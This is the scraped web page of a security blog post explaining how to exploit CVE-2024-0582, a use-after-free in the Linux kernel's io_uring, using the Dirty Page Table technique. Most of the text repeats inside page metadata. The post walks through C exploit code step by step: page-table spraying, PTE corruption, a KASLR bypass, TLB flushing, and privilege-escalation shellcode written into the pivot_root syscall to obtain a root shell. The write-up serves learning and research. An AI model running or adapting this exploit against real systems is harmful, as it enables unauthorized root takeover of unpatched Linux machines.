&amp;real_prepare_kernel_cred, sizeof(real_prepare_kernel_cred)); memcpy(&amp;shellcode[25], &amp;real_commit_creds, sizeof(real_commit_creds)); Finally, the exploit writes its shellcode to the address space of the pivot_root() syscall via the corrupted page. If the last 2 bytes of your pivot_root() syscall’s offset include a value like 0x2bf900, you’ll need to add the page offset (0x900 in this case) to your overlapped userspace page address before calling memcpy(). In my case, however, the offset of pivot_root is 0x2bf000, so no adjustment is necessary. It then invokes the pivot_root() syscall, which results in the execution of the injected shellcode — ultimately yielding a root shell :) 1 2 3 4 5 6 7 8 9 10 /* Write the patched shellcode to the overlapping page */ printf(&quot;[*] Writing shellcode to overlapped page at %p...\n&quot;, overlap_page); fflush(stdout); memcpy(overlap_page, shellcode, sizeof(shellcode)); printf(&quot;[*] Shellcode written successfully.\n&quot;); fflush(stdout); /* Trigger shellcode execution by invoking pivot_root syscall */ pivot_root(&quot;/opt&quot;, &quot;/opt/aa&quot;); get_shell(); Conclusion To sum up, I demonstrated the Dirty Page Table attack technique by exploiting a page-based use-after-free vulnerability discovered by Project Zero in the Linux kernel’s io_uring subsystem. If you’re interested in data-only attack strategies, you can check out my GitHub repository, which includes proof-of-concept exploits for this vulnerability using both the Dirty Cred and Dirty Page Table methods." /><link rel="canonical" href="https://kuzey.rs/posts/Dirty_Page_Table/" /><meta property="og:url" content="https://kuzey.rs/posts/Dirty_Page_Table/" /><meta property="og:site_name" content="Cyber Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-04-13T12:00:00+03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Exploiting CVE-2024-0582 via the Dirty Page Table Method" /><meta name="twitter:site" content="@kuzeyardabulut" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-04-13T12:00:00+03:00","datePublished":"2025-04-13T12:00:00+03:00","description":"Introduction This post discusses a popular exploitation method in today’s cybersecurity community. Specifically, we’ll dive into the Dirty Page Table method by showcasing its use on a real-world page UAF (use-after-free) vulnerability in io_uring. Although this article addresses the vulnerability itself, our focus is on the exploitation technique rather than the bug’s details. For an in-depth analysis of the vulnerability, you can read Oriol Castejón’s blog. Vulnerability In 2024, a Project Zero issue popped up, revealing a powerful new bug in the io_uring module. The issue mentioned a page UAF (use-after-free) primitive that gives attackers a chance to write data over previously freed pages. This primitive is considered substantially dangerous in terms of exploitability nowadays because it allows attackers to easily implement data-only attacking methods that manipulate physical memory. To demonstrate the Dirty Page Table attacking method, this article uses the PoC that was provided by a Project Zero issue. Exploitation In typical object-based UAF exploits, it’s important to gain control of the memory slab that held the freed object in order to perform effective heap spraying. In our scenario, however, the vulnerability is page-based, meaning we control an entire page of memory. This broader control simplifies and enhances our ability to spray and manipulate memory. When the kernel allocates page tables, it requests a free page from the buddy allocator. If we have control over a freed page in the buddy allocator, we can cause the kernel to reuse that page for its page table allocation. Once the kernel uses this controlled page as a page table, we can poison the Page Table Entries (PTEs). The Dirty Page Table technique exploits a dangling page (freed but not yet reclaimed) to corrupt these PTEs. By modifying a PTE, we redirect a user-space virtual address to a chosen kernel-space physical address. This allows us to overwrite a targeted region of kernel memory (in this exploit, the memory backing the pivot_root() system call), enabling us to inject and execute shellcode. The following code snippet prepares pages and sets up io_uring before triggering the bug. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 int main(void) { int ret; void *overlap_page = NULL, *pbuf_mapping = NULL; void *page_spray[N_PAGESPRAY]; struct io_uring_buf_reg reg = { .ring_entries = 1, .bgid = 0, .flags = IOU_PBUF_RING_MMAP }; struct io_uring_buf_reg unreg; struct io_uring_params params; memset(&amp;unreg, 0, sizeof(unreg)); memset(&amp;params, 0, sizeof(params)); printf(&quot;[*] PID: %d\\n&quot;, getpid()); fflush(stdout); /* Bind process to current CPU core */ set_cpu_affinity(); printf(&quot;[*] Initializing io_uring...\\n&quot;); fflush(stdout); int uring_fd = io_uring_setup(40, &amp;params); if (uring_fd &lt; 0) { perror(&quot;io_uring_setup&quot;); exit(EXIT_FAILURE); } /* Prepare pages (PTE not allocated at this moment) */ for (int i = 0; i &lt; N_PAGESPRAY; i++) { page_spray[i] = mmap((void *)(0x200000 + i * 0x10000UL), 0x8000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0); if (page_spray[i] == MAP_FAILED) { perror(&quot;mmap failed&quot;); exit(EXIT_FAILURE); } } printf(&quot;[*] io_uring instance created (fd: %d).\\n&quot;, uring_fd); fflush(stdout); /* Register a buffer ring with io_uring */ printf(&quot;[*] Registering buffer ring with io_uring...\\n&quot;); fflush(stdout); ret = io_uring_register(uring_fd, IORING_REGISTER_PBUF_RING, &amp;reg, 1); if (ret &lt; 0) { perror(&quot;io_uring_register (PBUF_RING) failed&quot;); close(uring_fd); exit(EXIT_FAILURE); } /* Map the buffer ring with mmap */ pbuf_mapping = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_PBUF_RING); if (pbuf_mapping == MAP_FAILED) { perror(&quot;mmap for buffer ring failed&quot;); close(uring_fd); exit(EXIT_FAILURE); } printf(&quot;[*] Buffer ring address: %p\\n&quot;, pbuf_mapping); fflush(stdout); ... Then, the exploit triggers the vulnerability by unregistering the buffer ring, which frees the page and returns it to the buddy allocator. 1 2 3 4 5 6 7 8 9 printf(&quot;[*] Unregistering buffer ring...\\n&quot;); fflush(stdout); ret = io_uring_register(uring_fd, IORING_UNREGISTER_PBUF_RING, &amp;unreg, 1); if (ret &lt; 0) { perror(&quot;io_uring_unregister (PBUF_RING) failed&quot;); munmap(pbuf_mapping, 0x1000); close(uring_fd); exit(EXIT_FAILURE); } At that point, the exploit needs to write data to the previously allocated pages in order to spray page tables. Albeit it reserved the pages beforehand using mmap, the page tables are allocated when those pages are written to. 1 2 3 4 5 6 7 8 /* Spray page table entries (PTEs) by writing to mapped pages */ printf(&quot;[*] Spraying page tables...\\n&quot;); fflush(stdout); for (int i = 0; i &lt; N_PAGESPRAY; i++) { for (int j = 0; j &lt; 8; j++) { *((char *)page_spray[i] + j * 0x1000) = &#39;a&#39;; } } The following figure illustrates the memory layout after a successful heap spray. When the exploit reads memory through a dangling pointer referencing the vulnerable page, it confirms that multiple distinct Page Table Entries (PTEs) have been created. It then selects the PTE located at the 8th index, corresponding to an offset of 0x38, to overwrite. 1 2 3 4 5 6 7 8 9 /* Inspect the PTEs in the mapped buffer */ uint64_t *page_table_entry = (uint64_t *)((char *)pbuf_mapping + 0x38); for (size_t offset = 0; offset &lt; 0x40; offset += sizeof(uint64_t)) { uint64_t value = *((uint64_t *)((char *)pbuf_mapping + offset)); printf(&quot;[*] PTE (%p): 0x%llx\\n&quot;, (void *)((char *)pbuf_mapping + offset), (value &amp; ~0xfffULL) &amp; ~(1ULL &lt;&lt; 63)); fflush(stdout); } These PTEs refer to one of the pages sprayed earlier, with each PTE covering a 0x1000-sized memory region. By patching the entry at offset 0x38, the exploit gains control over the address range from pbuf_mapping + 0x7000 to pbuf_mapping + 0x8000. By replacing the PTEs’ physical addresses with kernel physical addresses, the exploit effectively gains the ability to write to targeted kernel memory locations via userspace pages. However, most physical addresses are randomized when Kernel Address Space Layout Randomization (KASLR) is enabled; therefore, KASLR must first be bypassed. At this stage, the exploit can’t directly overwrite a PTE with the address of a kernel function because it does not yet know the kernel’s physical base address. Instead, the exploit overwrites the PTE with a fixed physical value that will lead to a kernel pointer leak—thereby bypassing KASLR. For instance, the value 0x800000000009c067, which I found from this blog post created by @ptr-yudai. While reading that blog post, I also discovered a useful tool worth mentioning: a customized version of GEF by @bata24, which allows traversing physical memory addresses directly in GDB. 1 2 3 4 5 /* Modify the PTE to leak the corresponding kernel physical address */ *page_table_entry = 0x800000000009c067; printf(&quot;[*] Updated PTE value: 0x%lx\\n&quot;, *page_table_entry); printf(&quot;[*] Searching for overlapping page...\\n&quot;); fflush(stdout); As a result of this PTE modification, one of the sprayed pages will now overlap with another page that contains a physical address we intend to leak. To find which page was affected, the exploit checks the bytes on each sprayed page (which were originally set to &#39;a&#39;). If any page no longer contains the expected values, it means that the page’s mapping has changed. That page is identified as the overlapping page containing the leaked address. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 for (int i = 0; i &lt; N_PAGESPRAY; i++) { for (int j = 0; j &lt; 8; j++) { if (*((char *)page_spray[i] + j * 0x1000) != &#39;a&#39;) { overlap_page = (char *)page_spray[i] + j * 0x1000; printf(&quot;[*] Overlapping page found: %p\\n&quot;, overlap_page); fflush(stdout); break; } } } if (overlap_page == NULL) { fprintf(stderr, &quot;[-] Overlapping page not found!\\n&quot;); exit(EXIT_FAILURE); } After identifying the overlapping page, the exploit proceeds to calculate the kernel’s physical base address by subtracting a predefined dummy offset, which may vary by kernel version. Once the base address is computed, it checks whether the result is greater than KERNEL_PHYSICAL_BASE_ADDR (typically 0x1000000) to determine whether KASLR is enabled on the target system. If the calculated physical address is less than 0x1000000, it indicates that KASLR is disabled and the kernel’s physical base address is statically set to 0x1000000. 1 2 3 4 5 6 7 8 /* Calculate kernel physical base. */ size_t kernel_phys_base = ((*(size_t *)overlap_page) &amp; ~0xfffULL) - 0x2604000; if (kernel_phys_base &lt; KERNEL_PHYSICAL_BASE_ADDR) { printf(&quot;[*] KASLR is not enabled on the target system!\\n&quot;); kernel_phys_base = KERNEL_PHYSICAL_BASE_ADDR; } printf(&quot;[*] Kernel physical base address: 0x%016lx\\n&quot;, kernel_phys_base); fflush(stdout); The calculated physical base address corresponds to the _text symbol in the kernel. By adding an appropriate offset to this base address, the exploit can redirect the overlapping page to a desired kernel address. The offsets of functions and structures remain consistent across both virtual and physical address spaces; hence, to determine these offsets, we can subtract the virtual or physical base address from the corresponding target virtual or physical address. The resulting offset is then added to the physical base address to compute the correct physical address. This calculated physical address is subsequently used to overwrite the PTE, allowing the userspace-controlled page to directly point to the targeted kernel memory region. Additionally, a useful GDB command—monitor gva2gpa—can translate a given virtual address into its corresponding physical address, simplifying this address resolution process during debugging. Next, to correctly patch the shellcode with valid kernel virtual addresses, the exploit must leak a kernel pointer and use it to calculate the correct kernel’s virtual base address. To achieve this, it overwrites the PTE of its overlapping page with the physical address of the init_task structure. This causes a kernel address (from the init_task structure) to be mapped into user-space, leaking a kernel virtual address. It then calculates the virtual base address of the kernel—typically corresponding to the _text symbol—by subtracting a predefined dummy offset from the leaked address. There’s one important detail to be cautious about. On my system, with KASLR enabled, the physical address of the init_task_struct was around 0xb480c900. However, because only the lower 4 bytes of this address could be written into the PTE, the value actually set was 0x80000000b480c067. This maps to an address 0x900 bytes before the init_task_struct. In my case, this misalignment was not an issue (since the leaked pointer was still valid). Nonetheless, if you want to eliminate the discrepancy, you can simply add 0x900 to your overlapped userspace page pointer to ensure proper alignment with the actual location of init_task_struct. 1 2 3 4 5 6 7 8 9 10 11 12 /* Patch the PTE to point to the initial task struct and leak its address to calculate the kernel&#39;s virtual base */ uint64_t phys_func = kernel_phys_base + INIT_TASK_STRUCT; *page_table_entry = (phys_func &amp; ~0xfffULL) | 0x8000000000000067ULL; printf(&quot;[*] Updated PTE value: 0x%lx\\n&quot;, *page_table_entry); fflush(stdout); flush_tlb_and_print(overlap_page, 0x1000); printf(&quot;[*] Leaked kernel pointer from the kernel mapping of the initial task struct: 0x%016zx\\n&quot;, *(size_t *)overlap_page); fflush(stdout); uint64_t kernel_virtual_addr_base = (*(size_t *)overlap_page) - 0x1a0c000; printf(&quot;[*] Kernel virtual base address: 0x%lx\\n&quot;, kernel_virtual_addr_base); fflush(stdout); There’s a particularly important detail in this part of the code: the flush_tlb_and_print() function, which the exploit uses to flush the TLB after overwriting the PTE. In modern CPU architectures, the Translation Lookaside Buffer (TLB) is a cache that speeds up the translation of virtual addresses to physical addresses by storing recently used PTEs. Therefore, after modifying a PTE, the CPU may still reference the old, cached translation. To ensure the new PTE mapping takes effect, the TLB must be forcibly flushed. This is essential to access the memory region corresponding to the updated PTE. In the exploit, this TLB flushing is performed using the mprotect() system call. First, the memory permissions for the corrupted page are changed to read-only. Meanwhile, the TLB was forced to flush its cached entry for that page. Then, the original permissions are restored to read-and-write, ensuring that the memory can be accessed as intended after the flush. If you want to dive deeper into the TLB flushing, you may find this impressive paper particularly insightful. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /* Flushes the TLB by temporarily changing memory permissions */ void flush_tlb_and_print(void *ptr, size_t count) { uint64_t *addresses = (uint64_t *)ptr; if (mprotect(addresses, count, PROT_READ) == -1) { perror(&quot;mprotect (set PROT_READ)&quot;); exit(EXIT_FAILURE); } /* Restore original permissions */ if (mprotect(addresses, count, PROT_READ | PROT_WRITE) == -1) { perror(&quot;mprotect (restore PROT_READ | PROT_WRITE)&quot;); exit(EXIT_FAILURE); } printf(&quot;[*] TLB flushed by changing memory permissions.\\n&quot;); fflush(stdout); } Since we have identified both the physical and virtual base addresses of the kernel and understand the structure of PTEs, we can now write the shellcode into the pivot_root() syscall using the following code. Be sure to account for the offset issue mentioned earlier, as it is crucial when the exploit patches the PTE with the physical address of the pivot_root() syscall. 1 2 3 4 5 6 /* Patch the PTE to point to the kernel address of the pivot_root syscall */ phys_func = kernel_phys_base + PIVOT_ROOT_OFFSET; *page_table_entry = (phys_func &amp; ~0xfffULL) | 0x8000000000000067ULL; flush_tlb_and_print(overlap_page, 0x1000); printf(&quot;[*] Leaked kernel pointer from the kernel mapping of the pivot_root syscall: 0x%016zx\\n&quot;, *(size_t *)overlap_page); fflush(stdout); Before writing our shellcode to the address space of the pivot_root() syscall, we first need to patch it with the correct kernel function addresses. To achieve this, we calculate the virtual addresses of init_task_struct, prepare_kernel_cred(), and commit_creds() by adding their known offsets to the leaked virtual base address of the kernel. If you need help finding the offset values of these elements, you can refer to this GitHub page. Despite the fact that these are 64-bit addresses, the exploit only embeds the lower 4 bytes. This is because the shellcode is crafted without the 0xffffffff prefix, which represents the upper 32 bits of a full 64-bit address. Besides, the exploit stores these values as uint32_t to simplify the patching process and avoid introducing null bytes, which could interfere with shellcode execution. Otherwise, including full 64-bit addresses directly might result in unexpected behavior or crashes. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 char shellcode[] = &quot;\\x48\\x31\\xFF&quot; /* xor rdi, rdi */ &quot;\\x48\\xC7\\xC7\\x00\\xB9\\xA0\\x82&quot; /* mov rdi, 0xffffffff82a0b900 --&gt; Placeholder for init_task_struct */ &quot;\\x48\\xC7\\xC1\\xF0\\x81\\x0B\\x81&quot; /* mov rcx, 0xffffffff810b81f0 --&gt; Placeholder for prepare_kernel_cred() */ &quot;\\xFF\\xD1&quot; /* call rcx */ &quot;\\x48\\x89\\xC7&quot; /* mov rdi, rax */ &quot;\\x48\\xC7\\xC1\\x60\\x7F\\x0B\\x81&quot; /* mov rcx, 0xffffffff810b7f60 --&gt; Placeholder for commit_creds() */ &quot;\\xFF\\xD1&quot; /* call rcx */ &quot;\\xC3&quot;; /* ret */ /* Calculate the proper addresses to be patched in */ uint32_t real_init_task = (uint32_t)(kernel_virtual_addr_base + INIT_TASK_STRUCT); uint32_t real_prepare_kernel_cred = (uint32_t)(kernel_virtual_addr_base + PREPARE_KERNEL_CRED_OFFSET); uint32_t real_commit_creds = (uint32_t)(kernel_virtual_addr_base + COMMIT_CREDS_OFFSET); printf(&quot;[*] Patching shellcode...\\n&quot;); printf(&quot;[*] init_task_struct: 0x0xffffffff%08x\\n&quot;, real_init_task); printf(&quot;[*] prepare_kernel_cred: 0x0xffffffff%08x\\n&quot;, real_prepare_kernel_cred); printf(&quot;[*] commit_creds: 0x0xffffffff%08x\\n&quot;, real_commit_creds); fflush(stdout); memcpy(&amp;shellcode[6], &amp;real_init_task, sizeof(real_init_task)); memcpy(&amp;shellcode[13], &amp;real_prepare_kernel_cred, sizeof(real_prepare_kernel_cred)); memcpy(&amp;shellcode[25], &amp;real_commit_creds, sizeof(real_commit_creds)); Finally, the exploit writes its shellcode to the address space of the pivot_root() syscall via the corrupted page. If the last 2 bytes of your pivot_root() syscall’s offset include a value like 0x2bf900, you’ll need to add the page offset (0x900 in this case) to your overlapped userspace page address before calling memcpy(). In my case, however, the offset of pivot_root is 0x2bf000, so no adjustment is necessary. It then invokes the pivot_root() syscall, which results in the execution of the injected shellcode — ultimately yielding a root shell :) 1 2 3 4 5 6 7 8 9 10 /* Write the patched shellcode to the overlapping page */ printf(&quot;[*] Writing shellcode to overlapped page at %p...\\n&quot;, overlap_page); fflush(stdout); memcpy(overlap_page, shellcode, sizeof(shellcode)); printf(&quot;[*] Shellcode written successfully.\\n&quot;); fflush(stdout); /* Trigger shellcode execution by invoking pivot_root syscall */ pivot_root(&quot;/opt&quot;, &quot;/opt/aa&quot;); get_shell(); Conclusion To sum up, I demonstrated the Dirty Page Table attack technique by exploiting a page-based use-after-free vulnerability discovered by Project Zero in the Linux kernel’s io_uring subsystem. If you’re interested in data-only attack strategies, you can check out my GitHub repository, which includes proof-of-concept exploits for this vulnerability using both the Dirty Cred and Dirty Page Table methods.","headline":"Exploiting CVE-2024-0582 via the Dirty Page Table Method","mainEntityOfPage":{"@type":"WebPage","@id":"https://kuzey.rs/posts/Dirty_Page_Table/"},"url":"https://kuzey.rs/posts/Dirty_Page_Table/"}</script><title>Exploiting CVE-2024-0582 via the Dirty Page Table Method | Cyber Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Cyber Blog"><meta name="application-name" content="Cyber Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/terminal-icon.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Cyber Blog</a></div><div class="site-subtitle font-italic">Cybersecurity related blogs</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/disclaimer/" class="nav-link"> <i class="fa-fw fas fa-gavel ml-xl-3 mr-xl-3 unloaded"></i> <span>DISCLAIMER</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/kuzeyardabulut" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/kuzeyardabulut" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-5" > <i class="fas fa-rss"></i> </a> <a href="https://www.linkedin.com/in/kuzeyardabulut/" aria-label="linkedin" class="order-6" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Exploiting CVE-2024-0582 via the Dirty Page Table Method</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Exploiting CVE-2024-0582 via the Dirty Page Table Method</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Kuzey Arda Bulut </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Apr 13, 2025, 12:00 PM +0300" >Apr 13<i class="unloaded">2025-04-13T12:00:00+03:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2621 words">14 min read</span></div></div><div class="post-content"><h2 id="introduction">Introduction</h2><p>This post discusses a popular exploitation method in today’s cybersecurity community. Specifically, we’ll dive into the <strong>Dirty Page Table</strong> method by showcasing its use on a real-world page UAF (use-after-free) vulnerability in <code class="language-plaintext highlighter-rouge">io_uring</code>.</p><p>Although this article addresses the vulnerability itself, our focus is on the exploitation technique rather than the bug’s details. For an in-depth analysis of the vulnerability, you can read <a href="https://blog.exodusintel.com/2024/03/27/mind-the-patch-gap-exploiting-an-io_uring-vulnerability-in-ubuntu/">Oriol Castejón’s blog</a>.</p><h2 id="vulnerability">Vulnerability</h2><p>In 2024, <a href="https://project-zero.issues.chromium.org/issues/42451653">a Project Zero issue</a> popped up, revealing a powerful new bug in the io_uring module. The issue mentioned a page UAF (use-after-free) primitive that gives attackers a chance to write data over previously freed pages. This primitive is considered substantially dangerous in terms of exploitability nowadays because it allows attackers to easily implement data-only attacking methods that manipulate physical memory.</p><p>To demonstrate the <strong>Dirty Page Table</strong> attacking method, this article uses the PoC that was provided by a Project Zero issue.</p><h2 id="exploitation">Exploitation</h2><p>In typical object-based UAF exploits, it’s important to gain control of the memory slab that held the freed object in order to perform effective heap spraying. In our scenario, however, the vulnerability is <strong>page-based</strong>, meaning we control an entire page of memory. This broader control simplifies and enhances our ability to spray and manipulate memory.</p><p>When the kernel allocates page tables, it requests a free page from the buddy allocator. If we have control over a freed page in the buddy allocator, we can cause the kernel to reuse that page for its page table allocation. Once the kernel uses this controlled page as a page table, we can poison the <strong>Page Table Entries (PTEs)</strong>.</p><p>The <strong>Dirty Page Table</strong> technique exploits a dangling page (freed but not yet reclaimed) to corrupt these PTEs. By modifying a PTE, we redirect a user-space virtual address to a chosen kernel-space physical address. This allows us to overwrite a targeted region of kernel memory (in this exploit, the memory backing the <code class="language-plaintext highlighter-rouge">pivot_root()</code> system call), enabling us to inject and execute shellcode.</p><p>The following code snippet prepares pages and sets up <code class="language-plaintext highlighter-rouge">io_uring</code> before triggering the bug.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
   <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
   <span class="kt">void</span> <span class="o">*</span><span class="n">overlap_page</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">*</span><span class="n">pbuf_mapping</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
   <span class="kt">void</span> <span class="o">*</span><span class="n">page_spray</span><span class="p">[</span><span class="n">N_PAGESPRAY</span><span class="p">];</span>
   <span class="k">struct</span> <span class="n">io_uring_buf_reg</span> <span class="n">reg</span> <span class="o">=</span> <span class="p">{</span>
      <span class="p">.</span><span class="n">ring_entries</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
      <span class="p">.</span><span class="n">bgid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
      <span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="n">IOU_PBUF_RING_MMAP</span>
   <span class="p">};</span>
   <span class="k">struct</span> <span class="n">io_uring_buf_reg</span> <span class="n">unreg</span><span class="p">;</span>
   <span class="k">struct</span> <span class="n">io_uring_params</span> <span class="n">params</span><span class="p">;</span>
 
   <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unreg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">unreg</span><span class="p">));</span>
   <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">params</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">params</span><span class="p">));</span>
 
   <span class="n">printf</span><span class="p">(</span><span class="s">"[*] PID: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">getpid</span><span class="p">());</span>
   <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
 
